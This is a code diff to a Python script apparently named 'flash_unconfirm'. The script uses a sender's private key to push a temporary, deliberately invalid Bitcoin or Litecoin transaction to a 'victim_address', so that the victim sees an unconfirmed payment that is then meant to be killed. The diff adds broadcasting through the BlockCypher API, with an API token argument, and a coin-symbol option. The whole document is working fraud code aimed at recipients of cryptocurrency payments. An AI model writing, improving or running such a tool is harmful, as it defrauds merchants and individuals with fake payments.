@@ -3,7 +3,8 @@ import argparse
 import requests
 import subprocess
 import cryptos
-
+import bitcoin
+import blockcypher
 from bs4 import BeautifulSoup
 
 parser = argparse.ArgumentParser(description="How To Use flash_unconfirm")
@@ -14,14 +15,21 @@ parser.add_argument("fake_send_to",
                     help="Fake send btc to address.",
                     type=str)
 parser.add_argument("amount_of_coins",
-                    help="Amount of coins sent. (Enter in BTC units) The maximum amount delayed will vary depending on send_from.",
+                    help="Amount of coins sent. The maximum amount delayed will vary depending on send_from.",
                     type=float)
+parser.add_argument("blockcypher_token",
+                    help="blockcypher_apikey",
+                    type=str)
+parser.add_argument("--coin-symbol",
+                    "-coin",
+                    help="Coin symbol.  btc, litecoin (Default=btc)",
+                    type=str,
+                    default="btc")
 parser.add_argument("--is_testnet",
-                    "-test",
-                    help="Testnet flag (Default=True)",
-                    default=True,
-                    type=bool)
-
+                    "-testnet",
+                    help="Testnet flag (Default = True)",
+                    type=bool,
+                    default=True)
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
     return round(btc_amount / satoshi)
@@ -60,10 +68,16 @@ def broadcast_transaction(raw_tx, testnet):
 args = parser.parse_args()
 fake_send_from   = args.send_from_wifkey
 victim_address   = args.fake_send_to
-amount_btc = args.amount_of_coins
-testnet    = args.is_testnet
+amount_btc  = args.amount_of_coins
+testnet     = args.is_testnet
+token       = args.blockcypher_token
+coin_symbol = args.coin_symbol
+testnet     = args.is_testnet
 
 transaction_util = cryptos.Bitcoin(testnet=testnet)
+if "ltc" in coin_symbol:
+    print("litecoin")
+    transaction_util = cryptos.Litecoin(testnet=testnet)
 print("OK")
 balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
 inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
@@ -117,11 +131,12 @@ print()
 time.sleep(3) #詠唱中...  -u- 
 
 print("SND TMP ITX TOBC  (ブロックチェーンに一時的な不正なトランザクションを送信!)")
-
-
+blockcypher.pushtx(tx_victim,
+                   coin_symbol=coin_symbol,
+                   api_key=token)
+#txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=0)
 #transaction_util.pushtx(tx_victim)
-broadcast_transaction(tx_victim, testnet)
-print()
+#broadcast_transaction(tx_victim, testnet)
 #おまけ
 print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
 print()
